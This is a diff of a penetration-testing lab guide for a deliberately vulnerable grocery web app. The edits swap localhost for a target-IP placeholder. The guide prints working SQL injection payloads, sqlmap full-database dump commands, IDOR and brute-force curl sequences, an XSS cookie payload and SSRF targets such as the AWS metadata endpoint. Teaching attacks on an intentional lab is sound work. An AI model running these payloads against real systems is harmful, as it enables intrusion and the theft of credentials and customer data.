@@ -93,7 +93,7 @@ fetch('/api/orders/PASTE_THEPUBCO_ORDER_UUID_HERE')
 ```bash
 # Get your session cookie from Firefox Developer Tools > Storage > Cookies
 curl -H "Cookie: connect.sid=your-session-cookie" \
-  http://localhost:5000/api/orders/THEPUBCO_ORDER_UUID
+  http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID
 ```
 
 ### Expected Result
@@ -178,7 +178,7 @@ admin' OR '1'='1
 **Alternative: Using curl**
 You can also verify the vulnerability using `curl` from the terminal:
 ```bash
-curl -X POST http://localhost:5000/api/login \
+curl -X POST http://<TARGETIP>:5000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
 ```
@@ -187,89 +187,78 @@ curl -X POST http://localhost:5000/api/login \
 
 SQLmap is a powerful automated SQL injection tool that can extract entire databases.
 
-**Step 1: Capture Login Request**
-1. Open Burp Suite and configure your browser proxy
-2. Attempt a normal login
-3. Find the POST request to `/api/login`
-4. Right-click > "Copy to file" > Save as `login-request.txt`
+**Recommended Approach: Product Search Endpoint**
 
-**Step 2: Run SQLmap**
-```bash
-# Basic detection
-sqlmap -r login-request.txt --batch --risk=3 --level=5
-
-# Extract all databases
-sqlmap -r login-request.txt --dbs
-
-# Extract tables from current database
-sqlmap -r login-request.txt --tables
-
-# Dump the users table
-sqlmap -r login-request.txt -D main -T users --dump
-
-# Extract all data from database
-sqlmap -r login-request.txt --dump-all
-```
-
-**Alternative: Direct URL Testing (for JSON API)**
-
-⚠️ **Important**: The login endpoint expects JSON, not form-encoded data:
+The product search endpoint is the simplest to test because it doesn't require authentication:
 
 ```bash
-# Test login endpoint with JSON payload
-sqlmap -u "http://localhost:5000/api/login" \
-  --data='{"username":"admin","password":"test"}' \
-  --headers="Content-Type: application/json" \
-  --batch --risk=3 --level=5
+# Step 1: Detect the SQL injection vulnerability
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
+  --batch --level=5 --risk=3 \
+  --dbms=SQLite
 
-# Test product search (also vulnerable, simpler GET endpoint)
-sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
-  --batch --risk=3 --level=5
+# Step 2: List all tables in the database
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
+  --tables --batch --dbms=SQLite
+
+# Step 3: Dump all data from the database
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
+  --dump-all --batch --dbms=SQLite --exclude-sysdbs
 ```
 
-**Troubleshooting if SQLmap doesn't detect the vulnerability:**
+**What you'll extract:**
+- Usernames and plaintext passwords
+- Email addresses
+- Company information
+- User roles (admin, customer)
+- All products, orders, and contact submissions
+
+**Alternative: Login Endpoint (More Complex)**
+
+The login endpoint is also vulnerable, but harder to test with SQLmap because the SQL injection happens during authentication itself. SQLmap may struggle because injected payloads break the login, causing 401 errors:
+
 ```bash
-# Add verbose output to see what's happening
-sqlmap -u "http://localhost:5000/api/login" \
-  --data='{"username":"admin","password":"test"}' \
+# Test login endpoint (may require manual testing instead)
+sqlmap -u "http://<TARGETIP>:5000/api/login" \
+  --data='{"username":"admin","password":"admin123"}' \
   --headers="Content-Type: application/json" \
-  -v 3
-
-# If still not working, try with wildcards for parameter detection
-sqlmap -u "http://localhost:5000/api/login" \
-  --data='{"username":"admin*","password":"test"}' \
-  --headers="Content-Type: application/json" \
-  --batch --risk=3 --level=5
+  --batch --level=5 --risk=3
 ```
 
-**Step 3: Analyse Results**
-SQLmap will:
-- ✅ Detect SQL injection vulnerability
-- ✅ Identify database type (SQLite)
-- ✅ Extract table names
-- ✅ Dump all usernames and **plaintext passwords**!
-- ✅ Extract customer data, orders, products, etc.
+**Note**: For the login endpoint, manual SQL injection testing (Method 1 above) is more reliable than SQLmap.
 
-**Expected SQLmap Output:**
+**Step 4: Analyse Results**
+
+After running the three commands above, SQLmap will:
+- ✅ **Step 1**: Detect SQL injection vulnerability (UNION query injection)
+- ✅ **Step 2**: List all tables (users, products, orders, order_items, reviews, contact_submissions)
+- ✅ **Step 3**: Dump all data including usernames and **plaintext passwords**!
+
+**Expected Output from Step 1 (Detection):**
 ```
-[INFO] testing 'SQLite inline queries'
-[INFO] confirming 'SQLite inline queries'
+[INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[INFO] GET parameter 'search' is vulnerable
 [INFO] the back-end DBMS is SQLite
-[INFO] fetching tables for database: 'main'
-Database: main
-[6 tables]
-+--------------------+
-| users              |
-| products           |
-| orders             |
-| order_items        |
-| reviews            |
-| contact_submissions|
-+--------------------+
+```
 
-[INFO] fetching columns for table 'users'
+**Expected Output from Step 2 (List Tables):**
+```
+Database: SQLite_masterdb
+[6 tables]
++---------------------+
+| contact_submissions |
+| order_items         |
+| orders              |
+| products            |
+| reviews             |
+| users               |
++---------------------+
+```
+
+**Expected Output from Step 3 (Dump All):**
+```
 [INFO] fetching entries for table 'users'
-Database: main
+Database: SQLite_masterdb
 Table: users
 [7 entries]
 +------+----------+----------+-------+
@@ -279,6 +268,8 @@ Table: users
 | ...  | thepubco | welcome123| customer |
 ...
 ```
+
+**Note**: SQLmap saves all extracted data to `/root/.sqlmap/output/<TARGETIP>/` as CSV and text files.
 
 ### Product Search is Also Vulnerable!
 
@@ -296,10 +287,13 @@ Enter in the search box:
 **Expected Result:**
 All products are returned, bypassing search filtering!
 
-**More Sophisticated Payload:**
+**More Sophisticated Payload (Extracting User Data):**
 ```sql
-' UNION SELECT id, 'HACKED' as name, category, price, description, image_url, stock FROM products--
+' UNION SELECT id, username as name, email as description, 'user' as category, 'N/A' as unit, 0 as price_per_unit, '' as image_url, 0 as stock FROM users --
 ```
+
+**Expected Result:**
+User accounts (including admin!) appear in the product list.
 
 ### Why This is Extremely Dangerous
 
@@ -337,21 +331,6 @@ const user = db.prepare(query).get(username, password);
 4. **Hashed passwords**: Use bcrypt (plaintext passwords are another vulnerability!)
 5. **Prepared statements**: Always use parameterized queries
 
-### Database Reset Instructions
-
-After heavy SQL injection testing, you may want to reset the database:
-
-**Command:**
-```bash
-tsx server/reset-database.ts
-```
-
-This will:
-- Delete `database.sqlite`
-- Recreate all tables
-- Repopulate with seed data (7 users, 20 products, historical orders)
-
----
 
 ## All 15 Vulnerabilities to Discover
 
@@ -423,10 +402,10 @@ This application contains 15 intentional security vulnerabilities organized by s
 
 #### 8. Server-Side Request Forgery (SSRF)
 **Location**: `POST /api/fetch-document`  
-**Test payload**: `{"url": "http://localhost:5000/api/config"}`  
+**Test payload**: `{"url": "http://<TARGETIP>:5000/api/config"}`  
 **Alternative targets**:
 - `http://169.254.169.254/latest/meta-data/` (AWS metadata)
-- `http://localhost:5000/data/customers.txt`
+- `http://<TARGETIP>:5000/data/customers.txt`
 - Internal network IPs
 **Impact**: Access to internal resources, credential exposure, port scanning  
 **OWASP**: A10:2021 - Server-Side Request Forgery
@@ -587,7 +566,7 @@ brew install --cask owasp-zap
 **Quick Scan (5 minutes):**
 ```
 1. Open ZAP
-2. Automated Scan → Enter: http://localhost:5000
+2. Automated Scan → Enter: http://<TARGETIP>:5000
 3. Attack → Select all scan policies
 4. Start Scan
 5. Review Alerts tab after completion
@@ -611,11 +590,11 @@ brew install --cask owasp-zap
 zap-cli quick-scan --self-contained \
   --spider -r \
   --ajax-spider \
-  http://localhost:5000/login
+  http://<TARGETIP>:5000/login
 
 # Scan product search
 zap-cli quick-scan \
-  http://localhost:5000/products
+  http://<TARGETIP>:5000/products
 ```
 
 **Expected Findings:**
@@ -672,13 +651,13 @@ sqlmap -r login-request.txt --dump-all --dbms=SQLite --exclude-sysdbs
 **Method B: Direct URL with JSON** (if Burp unavailable)
 ```bash
 # For API endpoints that expect JSON:
-sqlmap -u "http://localhost:5000/api/login" \
+sqlmap -u "http://<TARGETIP>:5000/api/login" \
   --data='{"username":"admin","password":"test"}' \
   --headers="Content-Type: application/json" \
   --batch --dbms=SQLite
 
 # If SQLmap needs help finding the parameter, add a marker:
-sqlmap -u "http://localhost:5000/api/login" \
+sqlmap -u "http://<TARGETIP>:5000/api/login" \
   --data='{"username":"admin*","password":"test"}' \
   --headers="Content-Type: application/json" \
   --dbms=SQLite
@@ -687,12 +666,12 @@ sqlmap -u "http://localhost:5000/api/login" \
 **Test 2: Product Search SQL Injection**
 ```bash
 # Test product search endpoint
-sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
   --batch --dbms=SQLite \
   --level=5 --risk=3
 
 # Extract product table
-sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
   --dbms=SQLite -T products --dump
 ```
 
@@ -701,7 +680,7 @@ sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
 # First, get a valid session cookie by logging in
 # Copy connect.sid value from Firefox Developer Tools (Storage > Cookies)
 
-sqlmap -u "http://localhost:5000/api/orders/ORDER_UUID_HERE" \
+sqlmap -u "http://<TARGETIP>:5000/api/orders/ORDER_UUID_HERE" \
   --cookie="connect.sid=YOUR_SESSION_COOKIE" \
   --dbms=SQLite \
   --dump -T orders
@@ -752,13 +731,13 @@ brew install nikto         # macOS
 **Scan Manchester Fresh Foods:**
 ```bash
 # Basic scan
-nikto -h http://localhost:5000
+nikto -h http://<TARGETIP>:5000
 
 # Comprehensive scan with all plugins
-nikto -h http://localhost:5000 -Tuning x
+nikto -h http://<TARGETIP>:5000 -Tuning x
 
 # Save results
-nikto -h http://localhost:5000 -o nikto-report.html -Format html
+nikto -h http://<TARGETIP>:5000 -o nikto-report.html -Format html
 ```
 
 **Expected Findings:**
@@ -817,45 +796,45 @@ nikto -h http://localhost:5000 -o nikto-report.html -Format html
 **Test 1: SQL Injection in Login**
 ```bash
 # Authentication bypass
-curl -X POST http://localhost:5000/api/login \
+curl -X POST http://<TARGETIP>:5000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
   -c cookies.txt \
   -v
 
 # Check if logged in
-curl http://localhost:5000/api/user \
+curl http://<TARGETIP>:5000/api/user \
   -b cookies.txt
 ```
 
 **Test 2: IDOR - Access Other User's Orders**
 ```bash
 # Login as thepubco
-curl -X POST http://localhost:5000/api/login \
+curl -X POST http://<TARGETIP>:5000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"thepubco","password":"welcome123"}' \
   -c thepubco-cookies.txt
 
 # Get thepubco's orders
-curl http://localhost:5000/api/orders \
+curl http://<TARGETIP>:5000/api/orders \
   -b thepubco-cookies.txt \
   | jq '.[] | .id'  # Note the order UUIDs
 
 # Login as bella_italia
-curl -X POST http://localhost:5000/api/login \
+curl -X POST http://<TARGETIP>:5000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"bella_italia","password":"pasta2024"}' \
   -c bella-cookies.txt
 
 # Access thepubco's order using bella's session!
-curl http://localhost:5000/api/orders/THEPUBCO_ORDER_UUID \
+curl http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID \
   -b bella-cookies.txt
 ```
 
 **Test 3: XSS Payload Injection**
 ```bash
 # Inject XSS into profile bio
-curl -X POST http://localhost:5000/api/profile \
+curl -X POST http://<TARGETIP>:5000/api/profile \
   -H "Content-Type: application/json" \
   -b cookies.txt \
   -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
@@ -865,7 +844,7 @@ curl -X POST http://localhost:5000/api/profile \
 ```bash
 # Attempt 100 login requests (no rate limiting!)
 for i in {1..100}; do
-  curl -X POST http://localhost:5000/api/login \
+  curl -X POST http://<TARGETIP>:5000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test'$i'"}' \
     -s -o /dev/null -w "%{http_code}\n"
@@ -911,7 +890,7 @@ More dangerous payload (credential theft):
 ```
 1. Press F12 to open Firefox Developer Tools
 2. Go to the Storage tab
-3. Expand Cookies → http://localhost:5000
+3. Expand Cookies → http://<TARGETIP>:5000
 4. Find the connect.sid cookie
 5. Check for security issues:
    ❌ Missing HttpOnly flag (allows JavaScript access)
@@ -1032,7 +1011,7 @@ Follow this methodology to systematically test Manchester Fresh Foods:
 # Open application in browser with Wappalyzer enabled
 
 # 2. Spider the application
-nikto -h http://localhost:5000
+nikto -h http://<TARGETIP>:5000
 
 # 3. Manual exploration
 # - Browse all public pages (/, /products, /contact, /login, /register)
@@ -1090,7 +1069,7 @@ Admin:
 sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all
 
 # 3. Nikto full scan
-nikto -h http://localhost:5000 -Tuning x -o nikto-report.html -Format html
+nikto -h http://<TARGETIP>:5000 -Tuning x -o nikto-report.html -Format html
 ```
 
 **Review automated findings and prioritize manual verification**
